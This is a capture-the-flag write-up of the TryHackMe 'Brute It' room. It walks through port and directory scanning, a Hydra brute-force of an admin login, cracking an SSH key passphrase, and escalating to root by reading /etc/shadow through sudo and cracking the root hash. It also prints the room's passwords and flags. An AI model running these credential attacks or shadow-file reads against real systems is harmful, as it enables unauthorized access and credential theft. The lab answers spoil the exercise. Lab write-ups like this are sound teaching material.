# Brute It – TryHackMe Write-Up

<img width="1542" height="257" alt="Brute It" src="https://github.com/user-attachments/assets/4528a9c2-2eec-455f-99ed-ad505b0206b1" />

## Room Information

**Room:** Brute It  
**Platform:** TryHackMe  
**Room Link:** `https://tryhackme.com/room/bruteit`

> Learn how to brute-force, crack hashes, and escalate privileges in this box!

---

# Task 1 – About This Box

In this box, we will learn about:

- Brute-force attacks
- Hash cracking
- Privilege escalation

<img width="760" height="632" alt="Brute It Task 1" src="https://github.com/user-attachments/assets/34cb63e6-0199-4b50-92ae-18109d9dee04" />

---

## 1. Brute-Force

Brute-force attacks can be used to test multiple username and password combinations against a target service.

### Tools

- Hydra
- John the Ripper
- Burp Suite Intruder

### Example – Hydra

```bash
hydra -l admin -P /path/to/password/list.txt http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
```

---

## 2. Hash Cracking

Hash cracking involves testing candidate passwords against a captured or discovered password hash.

### Tools

- Hashcat
- John the Ripper
- Cain and Abel
- CrackStation
- Hashes.com

### Example – Hashcat

```bash
hashcat -m 0 -a 0 hashes.txt wordlist.txt
```

In this example:

```text
-m 0  = MD5 hash mode
-a 0  = Dictionary attack
```

---

## 3. Privilege Escalation

Privilege escalation is the process of identifying a way to gain higher-level permissions after obtaining initial access to a system.

### Tools / Techniques

**Linux:**

```bash
sudo -l
```

This command can be used to check which commands the current user is allowed to execute with `sudo`.

**Windows:**

- PowerSploit
- Windows Exploit Suggester

# Task 2 – Reconnaissance

Before attacking, let's gather some information about the target.

---

### 2–1. Search for open ports using Nmap. How many ports are open?

We can use Nmap to scan the target and identify open ports:

```bash
nmap -sC -sV <TARGET_IP>
```

The scan shows two open ports:

```text
22/tcp – SSH
80/tcp – HTTP
```
<img width="849" height="267" alt="image" src="https://github.com/user-attachments/assets/421a1494-f4ef-4f44-bc91-e9560e02ed0d" />
**Answer:**

```text
2
```

**Open Ports:**

| Port | Service |
|---|---|
| `22` | SSH |
| `80` | HTTP |

> **Result:** The target has **2 open ports: 22 (SSH) and 80 (HTTP)**.

### 2–2. What version of SSH is running?

From the Nmap scan results, we can identify the version of SSH running on port `22`.

```text
22/tcp – SSH
OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
```

**Answer:**

```text
7.6p1
```
<img width="835" height="250" alt="image" src="https://github.com/user-attachments/assets/0e7ce644-5bb0-4c5c-acc8-4161d7b62a3c" />

### 2–3. Which Linux distribution is running?

From the Nmap scan results, we can identify the Linux distribution running on the target machine.

The SSH service information indicates that the target is running **Ubuntu**.

<img src="file:///C:/Users/Facilitator/.config/joplin-desktop/resources/a0ed654e6f5c451ab0cff8fc211f7fc6.png">

**Answer:**

```text
Ubuntu
```

<img width="731" height="257" alt="image" src="https://github.com/user-attachments/assets/9b180ac4-0f08-4d90-a262-44e1c2f90316" />

### 2–4. Search for hidden directories on the web server. What is the hidden directory?

We can use **Gobuster** to perform directory enumeration on the web server.

```bash
gobuster dir -u http://10.10.41.244 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
<img width="742" height="380" alt="image" src="https://github.com/user-attachments/assets/7cdf6508-e35d-4850-a831-05ecafaa6bfe" />

This command uses Gobuster to search for hidden directories on the web server at `10.10.41.244`, using the following wordlist:

```text
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

The scan discovers the following directory:

<img width="696" height="430" alt="image" src="https://github.com/user-attachments/assets/cb5fd390-35be-4a8f-b087-4c71ed056625" />

```text
/admin (Status: 301)
```

**Answer:**

```text
/admin
```

# Task 3 – Getting a Shell

Find a form to get a shell on SSH.

---

### 3–1. What is the user:password of the admin panel?

First, navigate to the `/admin` page discovered during the reconnaissance phase.

By inspecting the login form, we learn that the username parameter is `user` and the password parameter is `pass`.

<img width="764" height="413" alt="image" src="https://github.com/user-attachments/assets/054afab8-ef03-4c9a-b2d1-ea0f0489c2c0" />

<img width="579" height="577" alt="image" src="https://github.com/user-attachments/assets/35f1a30f-e9f4-44c1-83cc-bc9894e7049f" />

```text
user
pass
```
<img width="765" height="671" alt="image" src="https://github.com/user-attachments/assets/7d5290ae-a4ae-42ed-9f67-b9fc19481560" />

We also identify the username as:

```text
admin
```

Now we can use **Hydra** with the `rockyou.txt` wordlist to brute-force the login form.
<img width="910" height="369" alt="image" src="https://github.com/user-attachments/assets/db45ad1e-df86-4d87-ba50-e827abbe313e" />

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.199.155 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid"
```

The important parts of the request are:

```text
user=^USER^
pass=^PASS^
```

The failure message is:

```text
Username or password invalid
```

After running Hydra, we find the following credentials:

<img width="1398" height="584" alt="image" src="https://github.com/user-attachments/assets/8870e69c-98a5-40d4-a344-cf047bd1447f" />

```text
Username: admin
Password: xavier
```

**Answer:**

```text
admin:xavier
```

---

### Login to the Admin Panel

Use the discovered credentials to log in:

```text
Username: admin
Password: xavier
```

> **Note:** If you are working in Vim and need to save and exit, use `:wq!`.


Here is a clean, well-structured GitHub README format in English for your writeup:


### 3–2. Crack the RSA key you found. What is John's RSA Private Key passphrase?

This guide outlines the step-by-step methodology to extract, convert, and crack an encrypted SSH RSA private key passphrase using `ssh2john.py` and `John the Ripper`.

### Step 1: Verify the Encrypted Private Key

Before attempting to crack the key, verify whether it is encrypted by inspecting its header:

```bash
cat id_rsa

```

If the file contains `Proc-Type: 4,ENCRYPTED`, the private key is protected by a passphrase and requires cracking before it can be used for authentication:

```text
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,XXXXXXXXXXXXXXXX

```

---

### Step 2: Locate `ssh2john.py`

`ssh2john.py` converts the private key into a hash format compatible with John the Ripper. Locate the script on your system:

```bash
locate ssh2john.py

```

*Example Output:*
`/opt/john/ssh2john.py` or `/usr/share/john/ssh2john.py`

---

### Step 3: Convert the Key to Hash Format

Run `ssh2john.py` against the `id_rsa` file and export the output to `hash.txt`:

```bash
python3 /opt/john/ssh2john.py id_rsa > hash.txt

```
<img width="1358" height="261" alt="image" src="https://github.com/user-attachments/assets/282b9a0f-a2e6-49c3-b98e-8159512930d1" />


<img width="564" height="500" alt="image" src="https://github.com/user-attachments/assets/2d2fb401-e90b-41a4-b957-50d4b1484d3b" />

---

### Step 4: Crack the Passphrase with John the Ripper

Perform a dictionary attack using the `rockyou.txt` wordlist:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

```

> **Note:** If prompted with a format warning regarding `ssh-opencl`, force the format explicitly:
> ```bash
> john --format=ssh --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
> 
> ```

#### Output:

```text
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status

rockinroll       (id_rsa)

1g 0:00:00:15 DONE 
Session completed.

```

**Cracked Passphrase:** `rockinroll`

---

### Step 5: SSH Authentication & Flag Retrieval

1. Set the correct strict permissions for the private key file (required by SSH):
```bash
chmod 600 id_rsa

```


2. Authenticate to the target machine using the cracked key:
```bash
ssh -i id_rsa john@<TARGET_IP>

```


3. Read the user flag from John's home directory:
```bash
cat user.txt

```


### 3–3.  - user.txt

```bash
┌──(root㉿kali)-[~]
└─# ssh -i id_rsa john@10.10.246.87
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  [https://help.ubuntu.com](https://help.ubuntu.com)
 * Management:     [https://landscape.canonical.com](https://landscape.canonical.com)
 * Support:        [https://ubuntu.com/advantage](https://ubuntu.com/advantage)

  System information as of Mon Aug  5 02:05:26 UTC 2024

  System load:  0.0               Processes:           100
  Usage of /:   25.7% of 19.56GB   Users logged in:     0
  Memory usage: 19%               IP address for eth0: 10.10.246.87
  Swap usage:   0%

 63 packages can be updated.
 0 updates are security updates.

Last login: Wed Sep 30 14:06:18 2020 from 192.168.1.106
john@bruteit:~$ ls
user.txt
john@bruteit:~$ cat user.txt 
THM{a_password_is_not_a_barrier}
john@bruteit:~$ 


```
<img width="933" height="626" alt="image" src="https://github.com/user-attachments/assets/d1d3b67b-f21b-49a3-be87-669b5d229f2d" />

```bash
ssh -i RSA.txt john@10.146.149.83

```
<img width="594" height="586" alt="image" src="https://github.com/user-attachments/assets/5d0bdbde-a211-4ec9-aab3-c183f4a07cfd" />


### 3–4. - Web flag?

<img width="898" height="148" alt="image" src="https://github.com/user-attachments/assets/4d06f5bc-f8e3-4ab4-9e43-9937e6f53e63" />

<img width="1920" height="406" alt="image" src="https://github.com/user-attachments/assets/0b2dc581-23b9-4301-ac39-e012b6021a3b" />


**Answer:** `THM{brut3_f0rce_is_e4sy}`

```

```

# Task 4: Privilege Escalation

## Q1 - Find a form to escalate your privileges. What is the root's password?

**Answer:** `football`

---

## Q2 - root.txt

**Answer:** `THM{pr1v1l3g3_3sc4l4t10n}`

---

### Step-by-Step Methodology

1. **Check Sudo Privileges:**  
   Run `sudo -l` to list privileges. User `john` can execute `/bin/cat` as `root` without a password:
   ```bash
   john@bruteit:~$ sudo -l
   # (root) NOPASSWD: /bin/cat

```

2. **Dump the Shadow File:**
Use `/bin/cat` with `sudo` to read `/etc/shadow` and extract the root password hash:
```bash
john@bruteit:~$ sudo cat /etc/shadow
# root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q2...

```


3. **Crack the Root Hash:**
Save the root hash into `bruteit.txt` on your attacker machine and crack it using `John the Ripper` with `rockyou.txt`:
```bash
/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt bruteit.txt
# Output: football (root)

```


4. **Switch to Root & Retrieve Root Flag:**
Switch to the root user using the cracked password and read `root.txt`:
```bash
john@bruteit:~$ su root
Password: football
root@bruteit:~# cat /root/root.txt
THM{pr1v1l3g3_3sc4l4t10n}

```



```

```





























